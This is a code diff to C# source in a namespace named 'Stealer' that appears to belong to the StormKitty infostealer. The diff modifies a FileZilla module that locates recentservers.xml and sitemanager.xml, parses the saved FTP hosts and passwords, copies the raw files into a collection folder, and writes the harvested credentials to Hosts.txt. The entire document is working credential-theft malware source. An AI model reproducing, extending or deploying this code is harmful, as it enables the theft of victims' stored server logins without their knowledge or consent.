@@ -17,7 +17,7 @@ namespace Stealer
             return new string[] { fz + "recentservers.xml", fz + "sitemanager.xml" };
         }
 
-        public static List<Password> Steal()
+        private static List<Password> Steal(string sSavePath)
         {
             List<Password> lpPasswords = new List<Password>();
 
@@ -33,6 +33,7 @@ namespace Stealer
                     if (!File.Exists(pwFile))
                         continue;
 
+                    // Open xml document
                     XmlDocument xDOC = new XmlDocument();
                     xDOC.Load(pwFile);
 
@@ -47,13 +48,14 @@ namespace Stealer
 
                         Counter.FTPHosts++;
                         lpPasswords.Add(pPassword);
-
                     }
 
+                    // Copy file
+                    File.Copy(pwFile, Path.Combine(sSavePath, new FileInfo(pwFile).Name));
+
                 }
-                catch { }
+                catch (Exception ex) { StormKitty.Logging.Log("Filezilla >> Failed collect passwords\n" + ex); }
             }
-            
             return lpPasswords;
         }
 
@@ -64,16 +66,17 @@ namespace Stealer
         }
 
         // Write FileZilla passwords
-        public static void WritePasswords(List<Password> pPasswords, string sSavePath)
+        public static void WritePasswords(string sSavePath)
         {
+            Directory.CreateDirectory(sSavePath);
+            List<Password> pPasswords = Steal(sSavePath);
             if (pPasswords.Count != 0)
             {
-                Directory.CreateDirectory(sSavePath);
                 foreach (Password p in pPasswords)
-                {
                     File.AppendAllText(sSavePath + "\\Hosts.txt", FormatPassword(p));
-                }
+                return;
             }
+            Directory.Delete(sSavePath);
         }
 
     }
